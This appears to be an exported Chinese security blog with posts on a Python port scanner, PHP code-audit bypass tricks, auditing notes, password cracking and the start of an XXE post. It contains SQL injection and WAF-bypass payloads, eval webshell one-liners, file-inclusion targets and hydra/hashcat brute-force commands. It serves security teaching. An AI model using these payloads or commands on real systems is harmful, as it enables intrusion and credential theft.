（若有输入内容，则会验证格式是否符合 email）url 域 type=”url” （若有输入内容，则会验证格式是否符合 url）数值域 type=”number” （若有设置最大值或最小值，则会验证数字是否在最大最小值之内）数值范围域 type=”range” （通过拖动滑块来选择数值）日期域 type=”date” （会调用浏览器自带的日期选择器，可设置的类型：date, month, week, time, datetime, datetime-local） type=”month” type=”week” type=”time” type=”datetime” type=”datetime-local” 色值域 type=”color” （会调用浏览器自带的颜色选择器）搜索域 type=”search” （用于搜索，站内搜索或 Google 搜索等，在输入框内容右侧通常会出现清除按钮）&lt;datalist&gt; 定义 input 元素的选项列表 &lt;keygen&gt; 定义生成秘钥&lt;output&gt; 定义多行的文本输入控件&lt;label&gt; 定义 input 元素的标注点击这里也可以选中&lt;textarea&gt; 定义多行的文本输入控件&lt;button&gt; 定义按钮（与 input 不同的是，button 内部可以放置更多的内容，比如文本或图像） 普通按钮 重置按钮 提交按钮【格式】&lt;blockquote&gt; 定义长的引用（通常四周会有缩进）WEB标准不是某一个标准，而是一系列标准的集合。网页主要由三部分组成：结构（Structure）、表现（Presentation）和行为（Behavior）。对应的标准也分三方面：结构化标准语言主要包括XHTML和XML，表现标准语言主要包括CSS，行为标准主要包括对象模型（如W3C DOM）、ECMAScript等。这些标准大部分由W3C起草和发布，也有一些是其他标准组织制订的标准，比如ECMA（European Computer Manufacturers Association）的ECMAScript标准。&lt;pre&gt; 定义预格式文本（通常会保留空格及换行符，并使用等宽字体显示，很适合用来表示计算机代码）for(var i=0; i]]></content>
      <tags>
        <tag>前端</tag>
        <tag>编程</tag>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python实现端口扫描]]></title>
    <url>%2F2016%2F08%2F24%2FPython%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%2F</url>
    <content type="text"><![CDATA[端口扫描端口扫描工具（Port Scanner）指用于探测服务器或主机开放端口情况的工具。常被计算机管理员用于确认安全策略，同时被攻击者用于识别目标主机上的可运作的网络服务。端口扫描定义是客户端向一定范围的服务器端口发送对应请求，以此确认可使用的端口。虽然其本身并不是恶意的网络活动，但也是网络攻击者探测目标主机服务，以利用该服务的已知漏洞的重要手段。端口扫描的主要用途仍然只是确认远程机器某个服务的可用性。扫描多个主机以获取特定的某个端口被称为端口清扫（Portsweep），以此获取特定的服务。例如，基于SQL服务的计算机蠕虫就会清扫大量主机的同一端口以在 1433 端口上建立TCP连接。 实现原理最简单的端口扫描工具使用TCP连接扫描的方式，即利用操作系统原生的网络功能，且通常作为SYN扫描的替代选项。Nmap将这种模式称为连接扫描，因为使用了类似Unix系统的connect()命令。如果该端口是开放的，操作系统就能完成TCP三次握手，然后端口扫描工具会立即关闭刚建立的该连接，防止拒绝服务攻击。这种扫描模式的优势是用户无需特殊权限。但使用操作系统原生网络功能不能实现底层控制，因此这种扫描方式并不流行。并且TCP扫描很容易被发现，尤其作为端口清扫的手段：这些服务会记录发送者的IP地址，入侵检测系统可能触发警报。还有另外一种扫描方式是SYN扫描，端口扫描工具不使用操作系统原生网络功能，而是自行生成、发送IP数据包，并监控其回应。这种扫描模式被称为“半开放扫描”，因为它从不建立完整的TCP连接。端口扫描工具生成一个SYN包，如果目标端口开放，则会返回SYN-ACK包。扫描端回应一个RST包，然后在握手完成前关闭连接。如果端口关闭了但未使用过滤，目标端口应该会持续返回RST包。这种粗略的网络利用方式有几个优点：给扫描工具全权控制数据包发送和等待回应时长的权力，允许更详细的回应分析。关于哪一种对目标主机的扫描方式更不具备入侵性存在一些争议，但SYN扫描的优势是从不会建立完整的连接。然而，RST包可能导致网络堵塞，尤其是一些简单如打印机之类的网络设备。此次使用的是第一种扫描方式，直接利用操作系统的socket连接接口，初步测试目标服务器的端口是否可以连接，如果可以则返回端口打开状态 实现步骤可以把程序分成下面几部分： 1.读取端口及目标服务器 2.测试TCP端口连接 3.输出开放端口结果 1.读取端口及目标服务器直接把目标服务器和端口范围作为参数传给我们的程序，程序运行参数： python port_scan.py - 程序中使用sys.argv[]来读取并初步处理,具体的语法请参考python sys.argv[]用法： #!/usr/bin/python # -*- coding: UTF-8 -*- &apos;&apos;&apos; @Author：joy_nick @博客：http://byd.dropsec.xyz/ &apos;&apos;&apos; import sys # portscan.py &lt;host&gt; &lt;start_port&gt;-&lt;end_port&gt; host = sys.argv[1] portstrs = sys.argv[2].split(&apos;-&apos;) start_port = int(portstrs[0]) end_port = int(portstrs[1]) 2.测试TCP端口连接我们进入到一个循环，在这个循环中依次对端口范围内的端口进行连接测试。 首先要在文件开始部分引入 socket 包： from socket import * 连接测试方法是： 创建socket 调用connect()函数 关闭连接 依次实现如下： 获取目标IP地址： target_ip = gethostbyname(host) 进入循环开始连接： opened_ports = [] for port in range(start_port, end_port + 1): sock = socket(AF_INET, SOCK_STREAM) sock.settimeout(10) result = sock.connect_ex((target_ip, port)) if result == 0: opened_ports.append(port) 附： 1.Python socket()介绍及使用方法 2.Python socket编程 3.输出开放端口结果这一步骤很简单，只需要打印opened_ports列表： print(&quot;Opened ports:&quot;) for i in opened_ports: print(i) 完整的代码如下： #!/usr/bin/python # -*- coding: utf-8 -*- &apos;&apos;&apos; @Author：joy_nick @博客：http://byd.dropsec.xyz/ &apos;&apos;&apos; import sys from socket import * # port_scan.py &lt;host&gt; &lt;start_port&gt;-&lt;end_port&gt; host = sys.argv[1] portstrs = sys.argv[2].split(&apos;-&apos;) start_port = int(portstrs[0]) end_port = int(portstrs[1]) target_ip = gethostbyname(host) opened_ports = [] for port in range(start_port, end_port): sock = socket(AF_INET, SOCK_STREAM) sock.settimeout(10) result = sock.connect_ex((target_ip, port)) if result == 0: opened_ports.append(port) print(&quot;Opened ports:&quot;) for i in opened_ports: print(i) 执行测试命令为： python port_scan.py 192.168.1.200 21-23 多线程端口扫描器上面的简单程序中，我们依次测试每个端口，如果要提高性能，可以考虑采用多线程的方式。 改进的方式如下： 1.把TCP连接测试封装进函数 2.每次循环都创建一个线程来执行1中的扫描函数 3.为了简化实现，把开放端口输出步骤写入到1的测试函数中 首先引入thread包，这个包是Python多线程实现需要的： import thread 实现TCP测试函数，需要注意print输出时候需要加锁，如果不加锁可能会出现多个输出混合在一起的错误状态，而锁需要在程序启动时创建，从而能让新建的线程共享这个锁： def tcp_test(port): sock = socket(AF_INET, SOCK_STREAM) sock.settimeout(10) result = sock.connect_ex((target_ip, port)) if result == 0: lock.acquire() print &quot;Opened Port:&quot;,port lock.release() 附： 1.Python的锁 2.多线程lock.acquire() 注意当输出执行完后要释放锁lock。 输入的处理及lock的创建可以放在main函数中： if __name__==&apos;__main__&apos;: # portscan.py &lt;host&gt; &lt;start_port&gt;-&lt;end_port&gt; host = sys.argv[1] portstrs = sys.argv[2].split(&apos;-&apos;) start_port = int(portstrs[0]) end_port = int(portstrs[1]) target_ip = gethostbyname(host) lock = thread.allocate_lock() 然后修改for循环： for port in range(start_port, end_port): thread.start_new_thread(tcp_test, (port,)) thread.start_new_thread 用来创建一个线程，该函数的第一个参数是一个线程中执行的函数，第二个参数必须是个元组，作为函数的输入，由于 tcp\_test 函数只有一个参数，所以我们使用(port,)这种形式表示这个参数为元组。 thread.start_new_thread参考资料如下： 这个是thread.start_new_thread(function,args[,kwargs])函数原型，其中function参数是你将要调用的线程函数；args是讲传递给你的线程函数的参数，它必须是个tuple类型（元组）；而kwargs是可选的参数。线程的结束一般依靠线程函数的自然结束；也可以在线程函数中调用thread.exit()，它抛出SystemExit exception，达到退出线程的目的。 这里运行程序会报错： Unhandled exception in thread started by sys.excepthook is missing lost sys.stderr 网上解释为： 第一个问题：因为主进程已经结束，相关的资源已经释放，而线程还在后台运行，所以会导致线程找不到相关的资源和定义第二个问题：因为主程序结束的时候，并没有等待子线程结束，也没有强制关闭子线程，因此还在后台运行，有两个办法可以让他们同时结束，一个办法是在在构建进程的时候增加参数 deamon=True, 第二个办法就是在程序最后增加thread1.join(),thread2.join() 但是并没有什么卵用，我的解决办法为： 在主函数上加里一个time.sleep(1) 完整的程序代码如下： #!/usr/bin/python # -*- coding: UTF-8 -*- &apos;&apos;&apos; @Author：joy_nick @博客：http://byd.dropsec.xyz/ &apos;&apos;&apos; import sys import thread from socket import * def tcp_test(port): sock = socket(AF_INET, SOCK_STREAM) sock.settimeout(10) result = sock.connect_ex((target_ip, port)) if result == 0: lock.acquire() print &apos;主机:%s&apos;%(target_ip) print &quot;开放的端口为:&quot;,port print &apos;\n&apos; lock.release() thread.exit() if __name__==&apos;__main__&apos;: # portscan.py &lt;host&gt; &lt;start_port&gt;-&lt;end_port&gt; host = sys.argv[1] portstrs = sys.argv[2].split(&apos;-&apos;) start_port = int(portstrs[0]) end_port = int(portstrs[1]) target_ip = gethostbyname(host) lock = thread.allocate_lock() for port in range(start_port, end_port): thread.start_new_thread(tcp_test, (port,)) time.sleep(1) 运行实例如下：]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>编程</tag>
        <tag>Python</tag>
        <tag>自动化</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP代码审计技巧]]></title>
    <url>%2F2016%2F08%2F23%2FPHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[1、$_SERVER[‘PHP_SELF’]和$_SERVER[‘QUERY_STRING’]，而$_SERVER并没有转义，造成了注入。 例如： /easy/index.php/aaa&apos;,(select/**/if((select/**/ord(substr(user(),1,1)))=114,sleep(3),0)),1)# 2、update更新时没有重构更新序列，导致更新其他关键字段 例如： id=1&amp;data=1991-03-16&amp;money=10000000 3、在 php中 如果使用了一个未定义的常量，PHP 假定想要的是该常量本身的名字，如同用字符串调用它一样（CONSTANT 对应 “CONSTANT”）。此时将发出一个 E_NOTICE 级的错误（参考http://php.net/manual/zh/language.constants.syntax.php） 例如： 未定义常量if(IN_ADMIN != TRUE) 等式不成立，非0、null都为true 4、PHP中自编写对标签的过滤或关键字过滤，应放在strip_tags等去除函数之后，否则引起过滤绕过。 例如： function mystrip_tags($string) { $string = remove_xss($string); $string = new_html_special_chars($string); $string = strip_tags($string);//remove_xss在strip_tags之前调用，所以很明显可以利用strip_tags函数绕过,在关键字中插入html标记. return $string; } 对关键字过滤之后存在字符替换、html去除等操作可构造多余字符绕过。 例如：提交 user/**/W&lt;a&gt;HERE/**/IF((S&lt;a&gt;ELECT/**/A&lt;a&gt;SCII(S&lt;a&gt;UBSTRING(PASSWORD,1,1))F&lt;a&gt;ROM/**/ts_user/**/L&lt;a&gt;IMIT 1)=101,1=S&lt;a&gt;LEEP(2.02),0)%23 由于全局关键字过滤之后存在strip_tags()函数可绕过。 5、当可控变量进入双引号中时可形成webshell 例如： $a = &quot;${@eval($_POST[s])}&quot;; $a = &quot;${${eval($_POST[s])}}&quot;; 因此代码执行使用${file_put_contents($_GET[f],$_GET[p])}可以生成webshell。 6、宽字节转编码过程中出现宽字节注入 例如：测试输入 %e5%5c%5c&#39; 两个\\&#39;则单引号出来 7、构造查询语句时无法删除目标表中不存在字段时可使用mysql多表查询绕过。 例如： select uid,password from users,admins；(uid存在于users、password存在于admins） 8、mysql中（反引号）能作为注释符，且会自动闭合末尾没有闭合的反引号。无法使用注释符的情况下使用别名as+反引号可闭合其后语句。 例如： select username,password from pre_common_statuser as ` as statistic from common_stat where uid=1 此处（password from pre_common_statuser as ）为注入语句，使用别名as与自带无视其后语句。 9、mysql的类型强制转换可绕过PHP中empty()函数对0的false返回。 例如：提交/?test=0axxx -&gt; empty($_GET[‘test’]) =&gt; 返回真 10、存在全局过滤时观察过滤条件是否有if判断进入，cms可能存在自定义safekey不启用全局过滤。通过程序遗留或者原有界面输出safekey导致绕过。 例如： if($config[&apos;sy_istemplate&apos;]!=&apos;1&apos; || md5(md5($config[&apos;sy_safekey&apos;]).$_GET[&apos;m&apos;])!=$_POST[&apos;safekey&apos;]) { foreach($_POST as $id=&gt;$v){ safesql($id,$v,&quot;POST&quot;,$config); $id = sfkeyword($id,$config); $v = sfkeyword($v,$config); $_POST[$id]=common_htmlspecialchars($v); } } 11、由于全局过滤存在白名单限定功能，可使用无用参数带入绕过。例如： if ($webscan_switch&amp;&amp;webscan_white($webscan_white_directory,$webscan_white_url)) 其中具体过滤代码如下： //后台白名单,后台操作将不会拦截,添加”|”隔开白名单目录下面默认是网址带 admin /dede/ 放行 $webscan_white_directory=’admin|/dede\/|/install/‘; //url白名单,可以自定义添加url白名单,默认是对phpcms的后台url放行 //写法：比如phpcms 后台操作url index.php?m=admin php168的文章提交链接post.php?job=postnew&amp;step=post ,dedecms 空间设置edit_space_info.php $webscan_white_url = array(‘index.php’ =&gt; ‘admin_dir=admin’,’post.php’ =&gt; ‘job=postnew&amp;step=post’,’edit_space_info.php’=&gt;’’); 只要让传入参数存在白名单目录或参数即可绕过。 利用白名单目录： http://www.target.com/index.php/dede/?m=foo&amp;c=bar&amp;id=1‘ and 1=2 union select xxx 由于请求中包含了白名单目录/dede/，所以放行。 利用白名单参数： http://www.target.com/index.php?m=foo&amp;c=bar&amp;admin_dir=admin&amp;id=1‘ and 1=2 union select xxx 请求中包含了白名单参数所以放行。 12、字符串截断函数获取定长数据，截取\或\’前一位，闭合语句。利用条件必须是存在两个可控参数，前闭合，后注入。例如： if (strlen($u_email)&gt;32) { $u_email = substring($u_email,32);} if (strlen($u_qq)&gt;16) { $u_qq = substring($u_qq,16);} if (strlen($u_phone)&gt;16) { $u_phone = substring($u_phone,16);} $u_phone=123456789012345\ 带入： UPDATE mac_user SET u_qq=&apos;$u_qq&apos;,u_email=&apos;$u_email&apos;,u_phone=&apos;123456789012345\&apos;,u_question=&apos;$u_question&apos;,u_answer=&apos;$u_answer&apos;,u_password=&apos;$u_password&apos; WHERE u_id=1 13、过滤了空格，逗号的注入，可使用括号包裹绕过。具体如遇到select from（关键字空格判断的正则，且剔除/**/等）可使用括号包裹查询字段绕过。例如： select(user)from(website); 另外一种方式： select{x table_name}from{x information_schema.tables} select{x(name)}from{x(manager)}; select{wooyun&apos;zone&apos;}from{mysql.user} select{x+table_name}from{x(information_schema.tables)} 14、由于PHP弱类型验证机制，导致==、in_array()等可通过强制转换绕过验证。例如： in_array($_GET[‘x’],array(1,2,3,4,5)) 访问?test=’1’testtest可判断成功。 15、WAF或者过滤了and|or的情况可以使用&amp;&amp;与||进行盲注。 FALSE的情况： 1 || 0 TRUE的情况： 1 || 1 例如： http://demo.74cms.com/user/user\_invited.php?id=1%20||%20strcmp(substr(user(),1,13),char(114,111,111,116,64,108,111,99,97,108,104,111,115,116))&amp;act=invited 16、windows下php中访问文件名使用”&lt;” “&gt;”将会被替换成”*” “?”，分别代表N个任意字符与1个任意字符。例如： file_get_contents(“/images/“.$_GET[‘a’].”.jpg”); 可使用test.php?a=../a&lt;%00访问对应php文件。]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>WAF绕过</tag>
        <tag>PHP</tag>
        <tag>webshell</tag>
        <tag>MySQL</tag>
        <tag>SQL注入</tag>
        <tag>代码审计</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《代码审计》读书笔记]]></title>
    <url>%2F2016%2F08%2F18%2F%E3%80%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[PHP核心配置文件： 1.register_globals=Off(全局变量注册开关) 2.allow_url_include=Off(是否允许包含远程文件)与此类似的还有allow_url_fopen 3.magic_quotes_gpc=On(魔术引号自动过滤)会自动在单引号、双引号、反斜杠、空字节(NULL)的前面加上反斜,但是在PHP5中不会过滤$SERVER变量所以可以利用client-ip、referer等漏洞 4.magic_quotes_runtime(魔术引号自动过滤)和上面一样，只是它只对从数据库或者文件中获取的数据进行过滤 5.magic_quotes_sybase(魔术引号自动过滤)只是将单引号转为双引号，转义空字节 6.safe_mode=on(安全模式)PHP5.4之后取消 7.open_basedir(PHP可访问目录)多个用;隔开 8.disable_functions(禁用函数)例如可以=phpinfo、eval、passthru、exec、system 9.display_errors和error_reporting=Off(错误显示) 常见的代码审计思路 1.根据敏感关键字回溯参数传递过程 2.查找可控变量，正向追踪变量传递过程 3.寻找敏感功能点，通读功能点代码 4.直接通读全文代码 文件上传时可以测试文件名是否存在SQL注入. 二次注入原理图,实例请看sqli-labs-24 SQL请求头注入：user-agent/referer/client-ip/x-forward-for 对宽字节注入的挖掘主要看如下关键字： SET NAMES character_set_client=gbk mysql_set_charset(&apos;gbk&apos;) 二次urldecode注入：1.php?id=1%2527 intval等字符转换intval(&quot;1&#39; union select &quot;) 输出：1 关于宽字节注入的推荐解决方法： 1.在执行查询前先执行SET NAMES &apos;gbk&apos;设置编码，设置character_set_client=binary 2.使用mysql_set_charset(&apos;gbk&apos;)设置编码，然后使用mysql_real_escasp_string()函数过滤参数 3.使用pdo方式，在PHP5.3.6及以下版本需要设置setAttribute来禁用prepared statements的防真效果 对于CSRF的防御： 1.增加token/referer验证避免img标签请求的攻击 2.增加验证码 Token实现测试代码： &lt;?php session_start(); function set_token() { $_SESSION[&apos;token&apos;] = md5(time()+rand(1,1000)); echo $_SESSION[&apos;token&apos;]; echo &apos;&lt;/br&gt;&apos;; } function check_token() { if(isset($_POST[&apos;token&apos;])&amp;&amp;$_POST[&apos;token&apos;] === $_SESSION[&apos;token&apos;]) return true; else return false; } if(isset($_SESSION[&apos;token&apos;])&amp;&amp;check_token()) { echo &quot;success&quot;; echo &apos;&lt;/br&gt;&apos;; } else { echo &quot;failed&quot;; echo &apos;&lt;/br&gt;&apos;; } set_token(); ?&gt; &lt;form method=&quot;post&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;&lt;?=$_SESSION[&apos;token&apos;]?&gt;&quot;&gt; &lt;input type=&quot;submit&quot;/&gt; &lt;/form&gt; 文件包含函数的区别： include()、include_once()在文件包含时即使遇到错误，下面的代码依然会继续执行 require()、require_once()则会直接报错退出程序 windows下可以包含日志文件 linux下可以包含/proc/self/environ(链接当前正在运行环境的进程)、/etc/passwd(密码文件) 等文件 php://filter/ PHP输入输出流读取文件 文件上传函数move_uploaded_file() 在上传文件时，在文件名后面加个空格（%20,或者%81-%99)，有时候可以绕过黑名单限制。 文件上传防御： 1.白名单方式过滤文件扩展名，使用in_array或者===来对比扩展名 2.保存文件时重命名文件，文件命名规则采用时间戳的拼接随机数的MD5方式&quot;md5(time()+rand(1,1000))&quot;. 代码执行漏洞函数： eval(),assert(),preg_replace(),call_user_func(),call_user_func_array(),array_map() mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject )搜索subject中匹配pattern,用replacement替换。如果pattern处存在/e参数，则replacement的值会被当成PHP代码来执行。 命令执行漏洞函数： system(),exec(),shell_exec(),passyhru(),pcntl_exec(),popen(),proc_open(),` 命令执行防注入函数： escapeshellcmd(),过滤整条命令(加^) &lt;?php echo (escapeshellcmd($_GET[&apos;cmd&apos;])); ?&gt; ?cmd=whoami() 输出：whoami^() escapesshellarg(),保证传入命令的参数是以字符串的形式存在 &lt;?php echo &apos;ls &apos;.escapeshellarg(&apos;cmd&quot;&apos;); ?&gt; 输出：ls &quot;cmd &quot; is_numeric()函数使用十六进制绕过 ==在判断之前先做变量类型转换，即只判断值 ===不会转换，即既判断值还判断类型 %00=NULL=0 http头注入常见的:user-agent,referer,client-ip/x-forward-for $_SERVER和$_FILES变量不受GPC保护 显示错误信息的函数开关:display_errors和error_reporting PHP是基于C开发，%00在URL编码后市\0，\0在C语言中是字符串的结束符。 iconv函数字符编码转换过程中遇到不能处理的字符串则后续的字符串也不会处理，导致截断（char(128)到char(255)之间都可以） php://输入输出流 php://input可以访问请求的原始数据的只读流，即可以直接读取到POST上没有经过解析的原始数据。 php://output是一个只写流，将流数据输出 php://filter是一个文件操作协议，可以对磁盘中的文件进行读写操作 php://filter/write=string.rot13/resource=example.txt,&quot;hello world&quot; php://filter/convert.base64-encode/resource=index.php PHP代码解析标签 脚本标签: &lt;script language=&quot;php&quot;&gt;...&lt;/script&gt; 短标签：&lt;?...?&gt;,需要php.ini中short_open_tag=on,默认是on asp标签：&lt;%...%&gt;,需要php.ini中asp_tags=on，默认是off client-ip的正则规则：^\d+\.\d+\.\d+\.\d+$ test.php%00jpg mysql报错注入的函数：floor(),updatexml(),extractvalue() 具体介绍请参考：MySql注入总结 windows findfirstfile利用：即使用&lt;,&gt;来代替不可知的文件名部分，如123.txt可以使用1&lt;&lt;来替换。 PHP中单引号代表纯字符串，双引号则是会解析中间的变量： &lt;?php $a=&quot;${@phpinfo()}&quot;;?&gt; #第一个字符为@ &lt;?php $a=&quot;${ phpinfo()}&quot;;?&gt; #第一个字符为空格 &lt;?php $a=&quot;${ phpinfo()}&quot;;?&gt; #第一个字符为TAB &lt;?php $a=&quot;${/**/phpinfo()}&quot;;?&gt; #第一个字符为注释符 &lt;?php $a=&quot;${ phpinfo()}&quot;;?&gt; #第一个字符为回车换行 &lt;?php $a=&quot;${+phpinfo()}&quot;;?&gt; #第一个字符为+ &lt;?php $a=&quot;${-phpinfo()}&quot;;?&gt; #第一个字符为- &lt;?php $a=&quot;${!phpinfo()}&quot;;?&gt; #第一个字符为！ 此外还有~，\等 对称加密算法：DES,3DES,TDEA,RC2,RC4,IDEA,AES 非对称加密：RSA 单向加密：MD4,MD5,sha1 验证码绕过： 1.不刷新直接绕过 2.暴力破解 3.机器识别 4.打码平台 用户登录漏洞： 1.撞库漏洞 用户名密码错误次数都无限制 单时间段内用户的密码错误次数限制 单时间段内IP登陆错误次数限制 2.API登陆 最后附上一个搜集的PHP代码审计脑图]]></content>
      <tags>
        <tag>XSS</tag>
        <tag>WAF绕过</tag>
        <tag>PHP</tag>
        <tag>命令执行</tag>
        <tag>SQL注入</tag>
        <tag>代码审计</tag>
        <tag>文件包含</tag>
        <tag>安全开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试:密码破解总结]]></title>
    <url>%2F2016%2F08%2F17%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%9A%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[0x00 前言一次渗透测试的过程总会涉及到”密码”与”加解密”.在测试的过程中,对弱口令的尝试是必不可少的过程。 0x01 整理一份优秀的字典想破解密码,要求我们已经”拥有”别人的密码.要整理一份优秀的字典,可以参考各大网站泄漏数据库,将密码(明文)字段收集后,依出现频率先后生成字典. 这里使用一个对已知的字典文件根据使用频率排序并输出的python脚本： #!/bin/bash/python #+------------------------------+ #@Author:Joy_nick #@Blog:http://byd.dropsec.xyz/ #+------------------------------+ import sys from collections import Counter file = open(sys.argv[1], &apos;r&apos;) readlist = [] count_times = [] for line in file.readlines(): line = line.strip(&apos;\r\n &apos;) readlist.append(line) sortlist = Counter(readlist).most_common() for line in sortlist: print line[0] 示例： 0x02 一手称心如意的工具集欲善其事,须利其器.密码枚举工具举一些例子： Hydra :各种服务账户密码猜解 Medusa : 类似Hydra Patator : Python多协议，全能暴力破解，模块化设计测试工具 Hashcat : GPU哈希破解 BurpSuite : 多线程密码枚举 Rcracki : 彩虹表哈希破解 Ophcrack : 离线LMHash/NTHash破解 Fcrackzip/Truecrack等特定文件密码破解工具 Metasploit : 各种辅助测试脚本 Cupp.py : 社工字典生成 … 0x03 绕过检测Web层有WAF,Service有IDS/IPS,在测试的时候很容易被发现。在测试前,先通过扫描等方式判断是否有相应的防护,并采取相应手段.Web层可能有验证码,可能有每秒IP连接数限制,可能通过Cookie/Header等信息判断行为.在通过一系列测试后,(如何测试还是要自己探索的),采用最合理的针对方式绕过或尽量避免被检测而拦截枚举账户密码。 0x04 Web账户枚举Web账户枚举是平日遇到较多的情况 没有做严谨的验证码等防护. 发现别人留下的backdoor. 撞库扫号. 常见的绕过验证的可能: 页面无需刷新验证码无限次使用 密码输入错误数次弹出验证码，但更换账号不会出现验证码 修改Cookie或User-Agent伪装逃避验证码 可批量轮询使用代理ip枚举绕过 在Web枚举中,使用BurpSuite基本可以解决所有常见问题. 开启代理,打开Intercept,登陆网页,输入用户密码,数据包拦截下来,选择Send to Intruder,进入攻击模块. 其中四种模式: Sniper:只有一个payload,会将payload分别放在每个Fuzz点测试,默认选项,这也是新手发现Payload只能选择1的原因. Battering Ram:只有一个payload,会将payload同时放在多个Fuzz点测试. Pitchfork:多个payload,会将多个payload同一行同时放到相应Fuzz点测试.(适用扫号) Cluster Bomb:多个payload,payload在其Fuzz点循环测试,直到尝试所有可能.(适用多账户枚举密码) 选择好相应模式后,设置payload为runtime file,挂载字典文件.取消Payload Encoding. 如果发现网页有将用户的本地将密码计算MD5后提交,则需要在Payload Processing中添加计算MD5的过程. 设置好后也可添加正则匹配结果等等.之后可以Start attack了. 这个过程中,如果担心IP地址暴露,可以选择加入一个client-ip这个payload来代理ip。 0x05 HTTP基础认证抓包可以看到,以默认用户名admin,默认密码admin登陆路由,HTTP Header多的部分像是这样: Authorization: Basic YWRtaW46YWRtaW4= Base64解密即为admin:admin.针对基础认证密码破解,依旧可以使用,但需要对用户名密码先做处理即先base64编码下,一个demo脚本如下: #!/usr/bin/python #+------------------------------+ #@Author:Joy_nick #@Blog:http://byd.dropsec.xyz/ #+------------------------------+ import os.path,sys,base64 userfile = raw_input(&quot;input usr file:&quot;) passfile = raw_input(&quot;input pwd file:&quot;) outputfile = raw_input(&quot;input out file:&quot;) outputfile = open(outputfile, &quot;w&quot;) userInfile = open(userfile) passInfile = open(passfile) userLines = userInfile.readlines() passLines = passInfile.readlines() for userLine in userLines: for passLine in passLines: combinedLine = userLine.strip() + &apos;:&apos; + passLine.strip() print combinedLine outputfile.write(base64.b64encode(combinedLine) + &apos;\n&apos;) userInfile.close() passInfile.close() outputfile.close() 生成字典后以Burp爆破即可. 也可以使用Hydra hydra -L user.txt -P pass.txt -F http://demourl:2048/auth 其中-L和-P大写均为挂载字典,-F表示全局一旦发现合法用户密码即停止破解,亦可加入-t参数指定线程数. 0x06 服务密码破解常见服务如FTP/SSH/TELNET/POP3/1433等的破解枚举. FTP hydra -L user.txt -P pass.txt -F ftp://127.0.0.1:21 SSH hydra -L user.txt -P pass.txt -F ssh://127.0.0.1:22 patator ssh_login host=127.0.0.1 user=root password=FILE0 0=pass.txt -x ignore:mesg=&apos;Authentication failed.&apos; SMB hydra -L user.txt -P pass.txt -F smb://127.0.0.1 MSSQL hydra -L user.txt -P pass.txt -F mssql://127.0.0.1:1433 0x07 社工字典生成以cupp.py工具为例,创建新字典使用: python cupp.py -i 用法： cupp.py [选项] h 帮助 i 交互式填写用户密码等相关信息 w 配置现有的字典文件 l 从库中下载 a 直接使用Alecto数据库的默认用户名和密码 v 版本信息 在填写相关信息后生成字典,然后就可以枚举了。 0x08 哈希破解普通哈希可以使用Ophcrack破解,官网给出了对应的彩虹表下载,当然,也可以直接查询. http://www.objectif-securite.ch/en/ophcrack.php 需要破解其他不常见密码哈希(借助已有web破解服务无法解决),暂时便只有三个相对高效的方法: 分布式 GPU 彩虹表 (没硬盘的就别想了) 而如果我们在知道密码的一定规则后,亦可按照规则破解密码. hashcat -m1800 -a3 hashdumpedfile --pw-min=7 --pw-max=11 &quot;hahaha?l?l?l?l&quot; 具体的hashcat密码破解详情请参考：HashCat使用手册 0x09 文件密码对于zip文件,由于加密方式没有rar强势,故被解密的可能性很大,一个kali下的破解工具命令如下: fcrackzip -b -v -c a -l 1-4 -u 1.zip -b指定暴力破解,-v显示详细信息,-c a指定密码为纯字母,-l 1-4指定密码长度位1-4位,-u指使用可能的密码进行解压缩测试(加上,否则会出现很多干扰密码) 具体的其他语法请参考：fcrackzip语法示例]]></content>
      <tags>
        <tag>爆破</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XXE Inject攻击与防御]]></title>
    <url>%2F2016%2F08%2F16%2FXXE-Inject%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%2F</url>
    <content type="text"><![CDATA[0x00 前言XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击. 在XML1.0标准⾥里,XML文档结构里定义了实体(entity)这个概念.实体可以通过预定义在文档中调用,实体的标识符可访问本地或远程内容.如果在这个过程中引入了”污染”源,在对XML文档处理后则可能导致信息泄漏等安全问题. 0x01 简介DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。 &lt;!DOCTYPE 根元素 [元素声明]&gt; &lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt; DTD实体entity，一般分为参数实体(外部实体)和内部实体；参数实体是一种只能在DTD中定义和使用的实体，一般引用时使用%作为前缀；内部实体是指用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用. &lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt; &lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt; 所以在XML中实体的用法如下： ENTITY的定义语法： &lt;!DOCTYPE filename [ &lt;!ENTITY entity-name &quot;entity-content&quot; ]&gt; //这就是DTD了 定义好的ENTITY在文档中通过“&amp;实体名;”来使用。类似于宏定义的一种东西。 0x02 威胁借助XXE,攻击者可以实现任意文件读取,DOS拒绝服务攻击以及代理扫描内网等. 对于不同XML解析器,对外部实体有不同处理规则,在PHP中默认处理的函数为: xml_parse和simplexml_load xml_parse的实现方式为expat库，默认情况不会解析外部实体,而simplexml_load默认情况下会解析外部实体,造成安全威胁. 除PHP外，在Java，Python等处理xml的组件及函数中都可能存在此问题. 0x03 语法举一个简单的例子： 